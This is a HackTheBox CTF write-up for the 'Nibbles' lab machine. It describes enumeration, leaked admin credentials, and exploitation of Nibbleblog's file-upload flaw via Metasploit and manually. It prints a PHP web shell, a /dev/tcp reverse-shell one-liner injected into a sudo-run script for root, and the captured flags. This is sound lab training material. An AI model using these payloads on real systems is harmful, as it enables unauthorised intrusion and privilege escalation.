---
title: Nibbles
date: 2025-05-21
description: Writeup for the "Nibbles" machine on HackTheBox. It involves discovering a vulnerable Nibbleblog CMS, exploiting it via Metasploit for initial access, and escalating privileges by abusing a writable script with sudo rights.
draft: false
hideToc: false
enableToc: true
enableTocContent: true
author: g4nd1v
authorEmoji: 👨‍💻
tags:
  - HackTheBox
  - htb-nibbles
  - ctf
  - nibbleblog
  - cms
  - metasploit
  - file-upload
  - reverse-shell
  - sudo
  - privilege-escalation
  - bash-script
categories:
  - HackTheBox
  - HackTheBox/Linux
image: images/Nibbles/banner.jpeg
---

# Nibbles

| Title       | [Nibbles](https://app.hackthebox.com/machines/121)                                                                                                                                                                                |
| ----------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Description | Writeup for the "Nibbles" machine on HackTheBox. It involves discovering a vulnerable Nibbleblog CMS, exploiting it via Metasploit for initial access, and escalating privileges by abusing a writable script with `sudo` rights. |
| Difficulty  | Easy                                                                                                                                                                                                                              |
| Maker       | [mrb3n8132](https://app.hackthebox.com/users/2984)                                                                                                                                                                                |

## Enumeration

```bash
└─$ cat nmap/tcp_default.nmap
# Nmap 7.95 scan initiated Wed May 21 16:27:52 2025 as: /usr/lib/nmap/nmap -sCV -T4 --min-rate 10000 -p- -v -oA nmap/tcp_default 10.10.10.75
Nmap scan report for nibbles.htb (10.10.10.75)
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So there are 2 ports that are open that is 22, and 80. Let's check the website on port 80.
![[Pasted image 20250521163028.png]]
There is nothing in the website, but if we see the source code of the website, we will see the directory `nibbleblog/`. Let's try to visit that directory and see if we can find anything out of there.
![[Pasted image 20250521163118.png]]
This looks some kind of CMS, if we look at the bottom of the webpage, we will see `Powered by Nibbleblog`. Let's try to search that on google. We can see there is an exploit available in metasploit (https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/). Let's try to check what are the requirements.
![[Pasted image 20250521164716.png]]
From the options, we can verify that we will need username and password in order to execute the exploit.

## User Flag

I have used `gobuster` in order to bruteforce directories!
![[Pasted image 20250521164830.png]]
It seems, we have 2 directories - `admin` and `content`. I have enumerated both of the directories and found this useful file at `http://nibbles.htb/nibbleblog/content/private/config.xml`. Where it is leaking the username, that is `admin` and for password I am guessing it should be nibbles as it is shown in many places (not directly though!).
![[Pasted image 20250521165001.png]]
Let's try to run the exploit with `admin:nibbles`!
![[Pasted image 20250521165136.png]]
We got the shell! Use `shell` to get into the shell and get full tty using `python3 -c 'import pty; pty.spawn("/bin/bash")'` and get the user flag.
![[Pasted image 20250521165412.png]]

> User Flag: `ec180a499aa80095143496c7bff08041`

## Root Flag

If we check `sudo -l` we will see,

```bash
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Unzip `personal.zip` from home directory and check what is `monitor.sh`. If we check the permission of `monitor.sh` we will see we can change this file!

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -al monitor.sh
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```

We will use this in order to get the shell.

- `echo "bash -c 'bash -i >& /dev/tcp/10.10.14.16/5555 0>&1'" > monitor.sh`
  ![[Pasted image 20250521171222.png]]
  In our `nc` session, we will get our shell
  ![[Pasted image 20250521171238.png]]
  > Root Flag: `c8135e7d2b4d2abedbd9f0a77d13a553`

## Extra

Let's try to do manual exploitation instead of metasploit. If we check the CVE on nist (https://nvd.nist.gov/vuln/detail/CVE-2015-6967) we will find the link of seclists's [blog](https://seclists.org/fulldisclosure/2015/Sep/5). Let's follow this blog and try to exploit step by step.

1. Get username and password in order to login into the portal. `admin:nibbles`
   http://nibbles.htb/nibbleblog/admin.php
   ![[Pasted image 20250521173357.png]]
2. Next, we will go to Plugins > My Image > Configure
   ![[Pasted image 20250521173500.png]]
3. Here there is a file upload functionality, let's make our shell and upload it to the website.
   Shell -> `shell.php` contains `<?php system($_REQUEST['cmd']); ?>`.
   ![[Pasted image 20250521173624.png]]
4. After uploading the shell, we will we will go to my image plugin in `private/` folder
   http://nibbles.htb/nibbleblog/content/private/plugins/my_image/
   ![[Pasted image 20250521173657.png]]
5. Executing the shell
   http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php?cmd=id
   ![[Pasted image 20250521173719.png]]
   That's all for this blog! See you in the next one :)
